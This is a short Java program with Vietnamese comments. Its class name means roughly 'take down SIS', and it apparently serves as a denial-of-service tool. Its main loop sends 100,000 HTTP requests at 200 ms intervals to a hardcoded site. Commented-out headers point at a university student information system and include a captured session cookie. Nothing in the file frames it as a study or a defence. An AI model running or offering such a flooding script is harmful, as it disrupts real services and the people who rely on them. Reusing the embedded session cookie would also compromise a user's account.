package test;
import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.Calendar;
import java.util.Iterator;

import org.jsoup.Connection;
import org.jsoup.Jsoup;  
import org.jsoup.nodes.Document;
import org.jsoup.nodes.Element;
import org.jsoup.select.Elements;
public class DanhSapSIS {
private static int i = 0;
	
	public static void Sap() throws IOException{
		
		//URL cua website can lay ma nguon
		String url = "http://thehung.tk/";
		
		//Tao 1 doi tuong URL va ket noi den website can lay ma nguon
		URL obj = new URL(url);
		
		//Tao 1 doi tuong HttpURLConnection mo ket noi den website
		HttpURLConnection con = (HttpURLConnection) obj.openConnection();

		//Phan header cua goi tin
		con.setRequestMethod("GET");
		con.setRequestProperty("Connection","keep-alive");
		//con.setRequestProperty("Upgrade-Insecure-Requests","1");
		
		//con.setRequestProperty("","");
		//con.setRequestProperty("Host","sis.hust.edu.vn");
		//con.setRequestProperty("User-Agent","Mozilla/5.0 (Windows NT 6.1; rv:50.0) Gecko/20100101 Firefox/50.0");
		//con.setRequestProperty("Accept","text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
		//con.setRequestProperty("Accept-Language", "vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3");
		//con.setRequestProperty("Accept-Encoding","gzip, deflate");
		//con.setRequestProperty("Cookie","_ga=GA1.3.1659967290.1473309719; ASP.NET_SessionId=1byhzy554rwh5yzohmtrga45");
		//con.setRequestProperty("DNT","1");
		
		//Dat gia tri SetDoOutput la true de co the su dung ket noi URL cho dau ra
		con.setDoOutput(true);
		//Tao 1 doi tuong DataOutputStream de lay ma nguon tu dau ra cua doi tuong HttpURLConnection
		DataOutputStream out = new DataOutputStream(con.getOutputStream());
		//Xa toan bo du lieu duoc luu trong DataOutputStream
		out.flush();
		//Dong DataOutputStream
		out.close();

		//Thong bao ma loi cua server (neu co)
		int responseCode = con.getResponseCode();
		//System.out.println("\nSending 'POST' request to URL : " + url);
		//System.out.println("Response Code : " + responseCode);
	}
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	public static void main( String[] args ) throws Exception{
		
		while(i < 100000){
			Thread.sleep(200);
			Sap();
			System.out.println(i);
			i++;
		}
	}
}







